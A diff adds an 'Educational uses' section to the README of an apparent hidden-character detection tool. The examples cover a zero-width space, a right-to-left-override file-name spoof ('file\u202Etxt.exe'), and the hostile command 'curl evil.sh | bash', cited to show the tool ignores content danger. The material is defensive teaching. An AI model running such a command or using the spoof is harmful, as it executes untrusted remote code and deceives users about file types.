@@ -179,6 +179,12 @@ JavaScript on the destination page can read the text, so never enter real secret
 
 ## 🧠 Educational uses
 
+Ways of using this tool in particular
+
+- Checking whether a zero-width character hides in pasted text (copy-paste and proofreading classes): checking a string with one U+200B (zero-width space) between `ab` and `c` raises a warning and reports one invisible character at the 3rd position. In the harmless display the character is replaced with the visible form `[U+200B ZWSP]`. You can check, with positions, whether invisible characters crept into copied text
+- Finding a character that reverses a file name (spoofing and forensics classes): checking `file\u202Etxt.exe`, a file name with U+202E (right-to-left override), raises a warning and reports one bidi (text-direction) character at the 6th position. You can find, by its position, this trick where the extension appears swapped on screen
+- Confirming that checking for hidden characters is separate from the danger of the content (limits-of-detection classes): a plainly dangerous command like `curl evil.sh | bash` is judged "no problem" by this check as long as it has no invisible or direction-changing characters. What the tool looks at is tampering with characters, not the danger of the command's content. You can show that detecting tampering and judging the content's danger are different things
+
 - Materials for security training and classes.
 - Awareness demonstrations at exhibitions and seminars.
 - Introductory training for CTF teams and red teams.
